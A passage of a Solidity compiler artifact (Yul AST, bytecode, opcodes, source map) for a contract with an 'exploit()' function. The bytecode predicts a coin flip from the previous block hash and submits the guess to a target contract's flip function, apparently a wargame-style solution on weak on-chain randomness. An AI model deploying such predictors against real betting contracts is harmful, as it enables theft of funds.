																				"name": "value",
																				"nativeSrc": "1045:5:2",
																				"nodeType": "YulIdentifier",
																				"src": "1045:5:2"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_bool",
																			"nativeSrc": "1030:14:2",
																			"nodeType": "YulIdentifier",
																			"src": "1030:14:2"
																		},
																		"nativeSrc": "1030:21:2",
																		"nodeType": "YulFunctionCall",
																		"src": "1030:21:2"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "1018:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "1018:6:2"
																},
																"nativeSrc": "1018:34:2",
																"nodeType": "YulFunctionCall",
																"src": "1018:34:2"
															},
															"nativeSrc": "1018:34:2",
															"nodeType": "YulExpressionStatement",
															"src": "1018:34:2"
														}
													]
												},
												"name": "abi_encode_t_bool_to_t_bool_fromStack",
												"nativeSrc": "949:109:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "996:5:2",
														"nodeType": "YulTypedName",
														"src": "996:5:2",
														"type": ""
													},
													{
														"name": "pos",
														"nativeSrc": "1003:3:2",
														"nodeType": "YulTypedName",
														"src": "1003:3:2",
														"type": ""
													}
												],
												"src": "949:109:2"
											},
											{
												"body": {
													"nativeSrc": "1156:118:2",
													"nodeType": "YulBlock",
													"src": "1156:118:2",
													"statements": [
														{
															"nativeSrc": "1166:26:2",
															"nodeType": "YulAssignment",
															"src": "1166:26:2",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nativeSrc": "1178:9:2",
																		"nodeType": "YulIdentifier",
																		"src": "1178:9:2"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "1189:2:2",
																		"nodeType": "YulLiteral",
																		"src": "1189:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nativeSrc": "1174:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "1174:3:2"
																},
																"nativeSrc": "1174:18:2",
																"nodeType": "YulFunctionCall",
																"src": "1174:18:2"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nativeSrc": "1166:4:2",
																	"nodeType": "YulIdentifier",
																	"src": "1166:4:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nativeSrc": "1240:6:2",
																		"nodeType": "YulIdentifier",
																		"src": "1240:6:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nativeSrc": "1253:9:2",
																				"nodeType": "YulIdentifier",
																				"src": "1253:9:2"
																			},
																			{
																				"kind": "number",
																				"nativeSrc": "1264:1:2",
																				"nodeType": "YulLiteral",
																				"src": "1264:1:2",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nativeSrc": "1249:3:2",
																			"nodeType": "YulIdentifier",
																			"src": "1249:3:2"
																		},
																		"nativeSrc": "1249:17:2",
																		"nodeType": "YulFunctionCall",
																		"src": "1249:17:2"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_bool_to_t_bool_fromStack",
																	"nativeSrc": "1202:37:2",
																	"nodeType": "YulIdentifier",
																	"src": "1202:37:2"
																},
																"nativeSrc": "1202:65:2",
																"nodeType": "YulFunctionCall",
																"src": "1202:65:2"
															},
															"nativeSrc": "1202:65:2",
															"nodeType": "YulExpressionStatement",
															"src": "1202:65:2"
														}
													]
												},
												"name": "abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed",
												"nativeSrc": "1064:210:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nativeSrc": "1128:9:2",
														"nodeType": "YulTypedName",
														"src": "1128:9:2",
														"type": ""
													},
													{
														"name": "value0",
														"nativeSrc": "1140:6:2",
														"nodeType": "YulTypedName",
														"src": "1140:6:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nativeSrc": "1151:4:2",
														"nodeType": "YulTypedName",
														"src": "1151:4:2",
														"type": ""
													}
												],
												"src": "1064:210:2"
											},
											{
												"body": {
													"nativeSrc": "1320:35:2",
													"nodeType": "YulBlock",
													"src": "1320:35:2",
													"statements": [
														{
															"nativeSrc": "1330:19:2",
															"nodeType": "YulAssignment",
															"src": "1330:19:2",
															"value": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "1346:2:2",
																		"nodeType": "YulLiteral",
																		"src": "1346:2:2",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nativeSrc": "1340:5:2",
																	"nodeType": "YulIdentifier",
																	"src": "1340:5:2"
																},
																"nativeSrc": "1340:9:2",
																"nodeType": "YulFunctionCall",
																"src": "1340:9:2"
															},
															"variableNames": [
																{
																	"name": "memPtr",
																	"nativeSrc": "1330:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "1330:6:2"
																}
															]
														}
													]
												},
												"name": "allocate_unbounded",
												"nativeSrc": "1280:75:2",
												"nodeType": "YulFunctionDefinition",
												"returnVariables": [
													{
														"name": "memPtr",
														"nativeSrc": "1313:6:2",
														"nodeType": "YulTypedName",
														"src": "1313:6:2",
														"type": ""
													}
												],
												"src": "1280:75:2"
											},
											{
												"body": {
													"nativeSrc": "1450:28:2",
													"nodeType": "YulBlock",
													"src": "1450:28:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "1467:1:2",
																		"nodeType": "YulLiteral",
																		"src": "1467:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "1470:1:2",
																		"nodeType": "YulLiteral",
																		"src": "1470:1:2",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nativeSrc": "1460:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "1460:6:2"
																},
																"nativeSrc": "1460:12:2",
																"nodeType": "YulFunctionCall",
																"src": "1460:12:2"
															},
															"nativeSrc": "1460:12:2",
															"nodeType": "YulExpressionStatement",
															"src": "1460:12:2"
														}
													]
												},
												"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
												"nativeSrc": "1361:117:2",
												"nodeType": "YulFunctionDefinition",
												"src": "1361:117:2"
											},
											{
												"body": {
													"nativeSrc": "1573:28:2",
													"nodeType": "YulBlock",
													"src": "1573:28:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "1590:1:2",
																		"nodeType": "YulLiteral",
																		"src": "1590:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "1593:1:2",
																		"nodeType": "YulLiteral",
																		"src": "1593:1:2",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nativeSrc": "1583:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "1583:6:2"
																},
																"nativeSrc": "1583:12:2",
																"nodeType": "YulFunctionCall",
																"src": "1583:12:2"
															},
															"nativeSrc": "1583:12:2",
															"nodeType": "YulExpressionStatement",
															"src": "1583:12:2"
														}
													]
												},
												"name": "revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db",
												"nativeSrc": "1484:117:2",
												"nodeType": "YulFunctionDefinition",
												"src": "1484:117:2"
											},
											{
												"body": {
													"nativeSrc": "1647:76:2",
													"nodeType": "YulBlock",
													"src": "1647:76:2",
													"statements": [
														{
															"body": {
																"nativeSrc": "1701:16:2",
																"nodeType": "YulBlock",
																"src": "1701:16:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nativeSrc": "1710:1:2",
																					"nodeType": "YulLiteral",
																					"src": "1710:1:2",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nativeSrc": "1713:1:2",
																					"nodeType": "YulLiteral",
																					"src": "1713:1:2",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nativeSrc": "1703:6:2",
																				"nodeType": "YulIdentifier",
																				"src": "1703:6:2"
																			},
																			"nativeSrc": "1703:12:2",
																			"nodeType": "YulFunctionCall",
																			"src": "1703:12:2"
																		},
																		"nativeSrc": "1703:12:2",
																		"nodeType": "YulExpressionStatement",
																		"src": "1703:12:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "1670:5:2",
																				"nodeType": "YulIdentifier",
																				"src": "1670:5:2"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nativeSrc": "1692:5:2",
																						"nodeType": "YulIdentifier",
																						"src": "1692:5:2"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_bool",
																					"nativeSrc": "1677:14:2",
																					"nodeType": "YulIdentifier",
																					"src": "1677:14:2"
																				},
																				"nativeSrc": "1677:21:2",
																				"nodeType": "YulFunctionCall",
																				"src": "1677:21:2"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nativeSrc": "1667:2:2",
																			"nodeType": "YulIdentifier",
																			"src": "1667:2:2"
																		},
																		"nativeSrc": "1667:32:2",
																		"nodeType": "YulFunctionCall",
																		"src": "1667:32:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nativeSrc": "1660:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "1660:6:2"
																},
																"nativeSrc": "1660:40:2",
																"nodeType": "YulFunctionCall",
																"src": "1660:40:2"
															},
															"nativeSrc": "1657:60:2",
															"nodeType": "YulIf",
															"src": "1657:60:2"
														}
													]
												},
												"name": "validator_revert_t_bool",
												"nativeSrc": "1607:116:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "1640:5:2",
														"nodeType": "YulTypedName",
														"src": "1640:5:2",
														"type": ""
													}
												],
												"src": "1607:116:2"
											},
											{
												"body": {
													"nativeSrc": "1789:77:2",
													"nodeType": "YulBlock",
													"src": "1789:77:2",
													"statements": [
														{
															"nativeSrc": "1799:22:2",
															"nodeType": "YulAssignment",
															"src": "1799:22:2",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nativeSrc": "1814:6:2",
																		"nodeType": "YulIdentifier",
																		"src": "1814:6:2"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nativeSrc": "1808:5:2",
																	"nodeType": "YulIdentifier",
																	"src": "1808:5:2"
																},
																"nativeSrc": "1808:13:2",
																"nodeType": "YulFunctionCall",
																"src": "1808:13:2"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nativeSrc": "1799:5:2",
																	"nodeType": "YulIdentifier",
																	"src": "1799:5:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "1854:5:2",
																		"nodeType": "YulIdentifier",
																		"src": "1854:5:2"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_bool",
																	"nativeSrc": "1830:23:2",
																	"nodeType": "YulIdentifier",
																	"src": "1830:23:2"
																},
																"nativeSrc": "1830:30:2",
																"nodeType": "YulFunctionCall",
																"src": "1830:30:2"
															},
															"nativeSrc": "1830:30:2",
															"nodeType": "YulExpressionStatement",
															"src": "1830:30:2"
														}
													]
												},
												"name": "abi_decode_t_bool_fromMemory",
												"nativeSrc": "1729:137:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nativeSrc": "1767:6:2",
														"nodeType": "YulTypedName",
														"src": "1767:6:2",
														"type": ""
													},
													{
														"name": "end",
														"nativeSrc": "1775:3:2",
														"nodeType": "YulTypedName",
														"src": "1775:3:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nativeSrc": "1783:5:2",
														"nodeType": "YulTypedName",
														"src": "1783:5:2",
														"type": ""
													}
												],
												"src": "1729:137:2"
											},
											{
												"body": {
													"nativeSrc": "1946:271:2",
													"nodeType": "YulBlock",
													"src": "1946:271:2",
													"statements": [
														{
															"body": {
																"nativeSrc": "1992:83:2",
																"nodeType": "YulBlock",
																"src": "1992:83:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
																				"nativeSrc": "1994:77:2",
																				"nodeType": "YulIdentifier",
																				"src": "1994:77:2"
																			},
																			"nativeSrc": "1994:79:2",
																			"nodeType": "YulFunctionCall",
																			"src": "1994:79:2"
																		},
																		"nativeSrc": "1994:79:2",
																		"nodeType": "YulExpressionStatement",
																		"src": "1994:79:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nativeSrc": "1967:7:2",
																				"nodeType": "YulIdentifier",
																				"src": "1967:7:2"
																			},
																			{
																				"name": "headStart",
																				"nativeSrc": "1976:9:2",
																				"nodeType": "YulIdentifier",
																				"src": "1976:9:2"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nativeSrc": "1963:3:2",
																			"nodeType": "YulIdentifier",
																			"src": "1963:3:2"
																		},
																		"nativeSrc": "1963:23:2",
																		"nodeType": "YulFunctionCall",
																		"src": "1963:23:2"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "1988:2:2",
																		"nodeType": "YulLiteral",
																		"src": "1988:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nativeSrc": "1959:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "1959:3:2"
																},
																"nativeSrc": "1959:32:2",
																"nodeType": "YulFunctionCall",
																"src": "1959:32:2"
															},
															"nativeSrc": "1956:119:2",
															"nodeType": "YulIf",
															"src": "1956:119:2"
														},
														{
															"nativeSrc": "2085:125:2",
															"nodeType": "YulBlock",
															"src": "2085:125:2",
															"statements": [
																{
																	"nativeSrc": "2100:15:2",
																	"nodeType": "YulVariableDeclaration",
																	"src": "2100:15:2",
																	"value": {
																		"kind": "number",
																		"nativeSrc": "2114:1:2",
																		"nodeType": "YulLiteral",
																		"src": "2114:1:2",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nativeSrc": "2104:6:2",
																			"nodeType": "YulTypedName",
																			"src": "2104:6:2",
																			"type": ""
																		}
																	]
																},
																{
																	"nativeSrc": "2129:71:2",
																	"nodeType": "YulAssignment",
																	"src": "2129:71:2",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nativeSrc": "2172:9:2",
																						"nodeType": "YulIdentifier",
																						"src": "2172:9:2"
																					},
																					{
																						"name": "offset",
																						"nativeSrc": "2183:6:2",
																						"nodeType": "YulIdentifier",
																						"src": "2183:6:2"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nativeSrc": "2168:3:2",
																					"nodeType": "YulIdentifier",
																					"src": "2168:3:2"
																				},
																				"nativeSrc": "2168:22:2",
																				"nodeType": "YulFunctionCall",
																				"src": "2168:22:2"
																			},
																			{
																				"name": "dataEnd",
																				"nativeSrc": "2192:7:2",
																				"nodeType": "YulIdentifier",
																				"src": "2192:7:2"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_bool_fromMemory",
																			"nativeSrc": "2139:28:2",
																			"nodeType": "YulIdentifier",
																			"src": "2139:28:2"
																		},
																		"nativeSrc": "2139:61:2",
																		"nodeType": "YulFunctionCall",
																		"src": "2139:61:2"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nativeSrc": "2129:6:2",
																			"nodeType": "YulIdentifier",
																			"src": "2129:6:2"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_bool_fromMemory",
												"nativeSrc": "1872:345:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nativeSrc": "1916:9:2",
														"nodeType": "YulTypedName",
														"src": "1916:9:2",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nativeSrc": "1927:7:2",
														"nodeType": "YulTypedName",
														"src": "1927:7:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nativeSrc": "1939:6:2",
														"nodeType": "YulTypedName",
														"src": "1939:6:2",
														"type": ""
													}
												],
												"src": "1872:345:2"
											}
										]
									},
									"contents": "{\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function panic_error_0x11() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x11)\n        revert(0, 0x24)\n    }\n\n    function checked_sub_t_uint256(x, y) -> diff {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n        diff := sub(x, y)\n\n        if gt(diff, x) { panic_error_0x11() }\n\n    }\n\n    function panic_error_0x12() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x12)\n        revert(0, 0x24)\n    }\n\n    function checked_div_t_uint256(x, y) -> r {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n        if iszero(y) { panic_error_0x12() }\n\n        r := div(x, y)\n    }\n\n    function cleanup_t_bool(value) -> cleaned {\n        cleaned := iszero(iszero(value))\n    }\n\n    function abi_encode_t_bool_to_t_bool_fromStack(value, pos) {\n        mstore(pos, cleanup_t_bool(value))\n    }\n\n    function abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_bool_to_t_bool_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function validator_revert_t_bool(value) {\n        if iszero(eq(value, cleanup_t_bool(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_bool_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_bool(value)\n    }\n\n    function abi_decode_tuple_t_bool_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_bool_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n}\n",
									"id": 2,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405234801561000f575f5ffd5b5060043610610029575f3560e01c806363d9b7701461002d575b5f5ffd5b610035610037565b005b5f6001436100459190610205565b405f1c9050805f5403610056575f5ffd5b805f819055505f6001548261006b9190610265565b90505f6001821461007c575f61007f565b60015b9050600115158115150361012e5760025f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f6760016040518263ffffffff1660e01b81526004016100e891906102af565b6020604051808303815f875af1158015610104573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061012891906102f6565b506101ca565b60025f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f675f6040518263ffffffff1660e01b815260040161018891906102af565b6020604051808303815f875af11580156101a4573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101c891906102f6565b505b505050565b5f819050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f61020f826101cf565b915061021a836101cf565b9250828203905081811115610232576102316101d8565b5b92915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601260045260245ffd5b5f61026f826101cf565b915061027a836101cf565b92508261028a57610289610238565b5b828204905092915050565b5f8115159050919050565b6102a981610295565b82525050565b5f6020820190506102c25f8301846102a0565b92915050565b5f5ffd5b6102d581610295565b81146102df575f5ffd5b50565b5f815190506102f0816102cc565b92915050565b5f6020828403121561030b5761030a6102c8565b5b5f610318848285016102e2565b9150509291505056fea26469706673582212202f488e115fc89ea40ddfe1057ebe35af5d437f9b1e55f2ea48f4f7cc0585fba764736f6c634300081c0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x29 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x63D9B770 EQ PUSH2 0x2D JUMPI JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x35 PUSH2 0x37 JUMP JUMPDEST STOP JUMPDEST PUSH0 PUSH1 0x1 NUMBER PUSH2 0x45 SWAP2 SWAP1 PUSH2 0x205 JUMP JUMPDEST BLOCKHASH PUSH0 SHR SWAP1 POP DUP1 PUSH0 SLOAD SUB PUSH2 0x56 JUMPI PUSH0 PUSH0 REVERT JUMPDEST DUP1 PUSH0 DUP2 SWAP1 SSTORE POP PUSH0 PUSH1 0x1 SLOAD DUP3 PUSH2 0x6B SWAP2 SWAP1 PUSH2 0x265 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH1 0x1 DUP3 EQ PUSH2 0x7C JUMPI PUSH0 PUSH2 0x7F JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP PUSH1 0x1 ISZERO ISZERO DUP2 ISZERO ISZERO SUB PUSH2 0x12E JUMPI PUSH1 0x2 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D263F67 PUSH1 0x1 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xE8 SWAP2 SWAP1 PUSH2 0x2AF JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x104 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x128 SWAP2 SWAP1 PUSH2 0x2F6 JUMP JUMPDEST POP PUSH2 0x1CA JUMP JUMPDEST PUSH1 0x2 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D263F67 PUSH0 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x188 SWAP2 SWAP1 PUSH2 0x2AF JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1A4 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x1C8 SWAP2 SWAP1 PUSH2 0x2F6 JUMP JUMPDEST POP JUMPDEST POP POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0x20F DUP3 PUSH2 0x1CF JUMP JUMPDEST SWAP2 POP PUSH2 0x21A DUP4 PUSH2 0x1CF JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP DUP2 DUP2 GT ISZERO PUSH2 0x232 JUMPI PUSH2 0x231 PUSH2 0x1D8 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0x26F DUP3 PUSH2 0x1CF JUMP JUMPDEST SWAP2 POP PUSH2 0x27A DUP4 PUSH2 0x1CF JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x28A JUMPI PUSH2 0x289 PUSH2 0x238 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2A9 DUP2 PUSH2 0x295 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x2C2 PUSH0 DUP4 ADD DUP5 PUSH2 0x2A0 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x2D5 DUP2 PUSH2 0x295 JUMP JUMPDEST DUP2 EQ PUSH2 0x2DF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x2F0 DUP2 PUSH2 0x2CC JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x30B JUMPI PUSH2 0x30A PUSH2 0x2C8 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x318 DUP5 DUP3 DUP6 ADD PUSH2 0x2E2 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0x2F BASEFEE DUP15 GT PUSH0 0xC8 SWAP15 LOG4 0xD 0xDF 0xE1 SDIV PUSH31 0xBE35AF5D437F9B1E55F2EA48F4F7CC0585FBA764736F6C634300081C003300 ",
							"sourceMap": "87:759:1:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;333:508;;;:::i;:::-;;;380:18;434:1;419:12;:16;;;;:::i;:::-;409:27;401:36;;380:57;;467:10;455:8;;:22;451:65;;493:8;;;451:65;541:10;530:8;:21;;;;565:16;597:6;;584:10;:19;;;;:::i;:::-;565:38;;617:9;641:1;629:8;:13;:28;;652:5;629:28;;;645:4;629:28;617:40;;684:4;676:12;;:4;:12;;;672:159;;720:5;;;;;;;;;;;:10;;;731:4;720:16;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;672:159;;;799:5;;;;;;;;;;;:10;;;810:5;799:17;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;672:159;366:475;;;333:508::o;7:77:2:-;44:7;73:5;62:16;;7:77;;;:::o;90:180::-;138:77;135:1;128:88;235:4;232:1;225:15;259:4;256:1;249:15;276:194;316:4;336:20;354:1;336:20;:::i;:::-;331:25;;370:20;388:1;370:20;:::i;:::-;365:25;;414:1;411;407:9;399:17;;438:1;432:4;429:11;426:37;;;443:18;;:::i;:::-;426:37;276:194;;;;:::o;476:180::-;524:77;521:1;514:88;621:4;618:1;611:15;645:4;642:1;635:15;662:185;702:1;719:20;737:1;719:20;:::i;:::-;714:25;;753:20;771:1;753:20;:::i;:::-;748:25;;792:1;782:35;;797:18;;:::i;:::-;782:35;839:1;836;832:9;827:14;;662:185;;;;:::o;853:90::-;887:7;930:5;923:13;916:21;905:32;;853:90;;;:::o;949:109::-;1030:21;1045:5;1030:21;:::i;:::-;1025:3;1018:34;949:109;;:::o;1064:210::-;1151:4;1189:2;1178:9;1174:18;1166:26;;1202:65;1264:1;1253:9;1249:17;1240:6;1202:65;:::i;:::-;1064:210;;;;:::o;1361:117::-;1470:1;1467;1460:12;1607:116;1677:21;1692:5;1677:21;:::i;:::-;1670:5;1667:32;1657:60;;1713:1;1710;1703:12;1657:60;1607:116;:::o;1729:137::-;1783:5;1814:6;1808:13;1799:22;;1830:30;1854:5;1830:30;:::i;:::-;1729:137;;;;:::o;1872:345::-;1939:6;1988:2;1976:9;1967:7;1963:23;1959:32;1956:119;;;1994:79;;:::i;:::-;1956:119;2114:1;2139:61;2192:7;2183:6;2172:9;2168:22;2139:61;:::i;:::-;2129:71;;2085:125;1872:345;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "171000",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"exploit()": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 87,
									"end": 846,
									"name": "PUSH",
									"source": 1,
